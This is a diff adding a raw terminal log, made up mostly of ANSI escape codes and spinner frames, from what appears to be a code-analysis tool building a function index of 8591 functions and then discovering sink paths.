@@ -1,0 +1,529 @@
+
+[1mPhase A: Path Discovery[0m
+  [36mBackend: tree-sitter[0m
+[?25l[32m⠋[0m [1mBuilding function index...[0m[2K[32m⠙[0m [1mBuilding function index...[0m[2K[32m⠹[0m [1mBuilding function index...[0m[2K[32m⠸[0m [1mBuilding function index...[0m[2K[32m⠼[0m [1mBuilding function index...[0m[2K[32m⠴[0m [1mBuilding function index...[0m[2K[32m⠦[0m [1mBuilding function index...[0m[2K[32m⠧[0m [1mBuilding function index...[0m[2K[32m⠇[0m [1mBuilding function index...[0m[2K[32m⠏[0m [1mBuilding function index...[0m[2K[32m⠋[0m [1mBuilding function index...[0m[2K[32m⠙[0m [1mBuilding function index...[0m[2K[32m⠹[0m [1mBuilding function index...[0m[2K[32m⠼[0m [1mBuilding function index...[0m[2K[32m⠴[0m [1mBuilding function index...[0m[2K[32m⠦[0m [1mBuilding function index...[0m[2K[32m⠧[0m [1mBuilding function index...[0m[2K[32m⠇[0m [1mBuilding function index...[0m[2K[32m⠏[0m [1mBuilding function index...[0m[2K[32m⠋[0m [1mBuilding function index...[0m[2K[32m⠙[0m [1mBuilding function index...[0m[2K[32m⠹[0m [1mBuilding function index...[0m[2K[32m⠸[0m [1mBuilding function index...[0m[2K[32m⠴[0m [1mBuilding function index...[0m[2K[32m⠦[0m [1mBuilding function index...[0m[2K[32m⠧[0m [1mBuilding function index...[0m[2K[32m⠇[0m [1mBuilding function index...[0m[2K[32m⠏[0m [1mBuilding function index...[0m[2K[32m⠋[0m [1mBuilding function index...[0m[2K[32m⠙[0m [1mBuilding function index...[0m[2K[32m⠸[0m [1mBuilding function index...[0m[2K[32m⠼[0m [1mBuilding function index...[0m[2K[32m⠴[0m [1mBuilding function index...[0m[2K[32m⠦[0m [1mBuilding function index...[0m[2K[32m⠧[0m [1mBuilding function index...[0m[2K[32m⠇[0m [1mBuilding function index...[0m[2K[32m⠏[0m [1mBuilding function index...[0m[2K[32m⠋[0m [1mBuilding function index...[0m[2K[32m⠙[0m [1mBuilding function index...[0m[2K[32m⠹[0m [1mBuilding function index...[0m[2K[32m⠸[0m [1mBuilding function index...[0m[2K[32m⠼[0m [1mBuilding function index...[0m[2K[32m⠦[0m [1mBuilding function index...[0m[2K[32m⠧[0m [1mBuilding function index...[0m[2K[32m⠇[0m [1mBuilding function index...[0m[2K[32m⠏[0m [1mBuilding function index...[0m[2K[32m⠋[0m [1mBuilding function index...[0m[2K[32m⠙[0m [1mBuilding function index...[0m[2K[32m⠹[0m [1mBuilding function index...[0m[2K[32m⠸[0m [1mBuilding function index...[0m[2K[32m⠼[0m [1mBuilding function index...[0m[2K[32m⠴[0m [1mBuilding function index...[0m[2K[32m⠦[0m [1mBuilding function index...[0m[2K[32m⠧[0m [1mBuilding function index...[0m[2K[32m⠇[0m [1mBuilding function index...[0m[2K[32m⠏[0m [1mBuilding function index...[0m[2K[32m⠋[0m [1mBuilding function index...[0m[2K[32m⠙[0m [1mBuilding function index...[0m[2K[32m⠸[0m [1mBuilding function index...[0m[2K[32m⠼[0m [1mBuilding function index...[0m[2K[32m⠴[0m [1mBuilding function index...[0m[2K[32m⠦[0m [1mBuilding function index...[0m[2K[32m⠧[0m [1mBuilding function index...[0m[2K[32m⠇[0m [1mBuilding function index...[0m[2K[32m⠏[0m [1mBuilding function index...[0m[2K[32m⠋[0m [1mBuilding function index...[0m[2K[32m⠙[0m [1mBuilding function index...[0m[2K[32m⠹[0m [1mBuilding function index...[0m[2K[32m⠸[0m [1mBuilding function index...[0m[2K[32m⠼[0m [1mBuilding function index...[0m[2K[32m⠴[0m [1mBuilding function index...[0m[2K[32m⠦[0m [1mBuilding function index...[0m
+[?25h[1A[2K  Functions: [1;36m8591[0m
+[?25l[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m